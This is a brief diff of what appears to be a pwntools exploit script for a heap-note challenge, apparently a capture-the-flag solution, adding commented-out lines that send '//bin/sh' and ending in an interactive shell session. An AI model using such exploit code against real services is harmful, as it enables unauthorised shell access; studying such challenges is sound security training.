@@ -328,6 +328,9 @@ add("A", "B", 600, pload )
 sleep(3)
 ## for calling edit in the rop
 p.sendafter("Note ID: ", "//bin/sh")
+## may also be needed, threads are being weird - i think our heap note thread is intercepting our stdin >:(.
+#p.send("//bin/sh")
+#p.send("//bin/sh")
 
 
 p.interactive()
